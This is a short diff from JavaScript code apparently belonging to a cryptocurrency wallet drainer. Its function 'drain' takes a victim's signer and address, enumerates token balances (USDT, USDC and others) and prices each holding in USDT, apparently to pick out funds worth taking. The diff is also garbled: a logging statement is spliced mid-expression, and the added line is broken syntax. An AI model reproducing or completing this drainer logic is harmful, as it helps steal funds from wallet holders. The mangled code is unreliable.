@@ -469,7 +469,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           if (formattedBalance > 0) {
             const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                           tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                          Object.keys(chainConfig.otherTokenAddresses       console.log(`✅ Network switched to chainId ${chainId}`);
+                          Object.keys(chainConfig.otherTokenAddresses);
       } catch "Unknown";
             const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
             const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
